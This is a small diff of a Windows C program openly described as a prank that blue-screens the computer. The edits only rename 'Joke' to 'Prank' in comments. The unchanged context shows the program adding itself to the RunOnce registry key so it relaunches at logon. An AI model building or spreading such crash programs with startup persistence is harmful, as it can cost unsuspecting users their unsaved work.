@@ -1,6 +1,6 @@
 /*
-	JokeProgram.Win32_x64.lol
-	Joke program that BSoDs your computer. Save your work first!
+	PrankProgram.Win32_x64.lol
+	Prank program that BSoDs your computer. Save your work first!
 	Copyright (C) 2023 AleXandro-1337
 
 	This program is free software: you can redistribute it and/or modify
@@ -318,7 +318,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	HKEY safeMsg;
 	LPSTR keyValue = StrCat(exePath, (LPSTR)" safe\0");
 	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, 0, 0, KEY_ALL_ACCESS, 0, &safeMsg, 0);
-	RegSetValueExA(safeMsg, "*lol", 0, REG_SZ, (LPBYTE)keyValue, lstrlenA(keyValue) + 1); //Tell user on startup that it was a joke =D
+	RegSetValueExA(safeMsg, "*lol", 0, REG_SZ, (LPBYTE)keyValue, lstrlenA(keyValue) + 1); //Tell user on startup that it was a prank =D
 	RegFlushKey(safeMsg);
 	RegCloseKey(safeMsg);
 
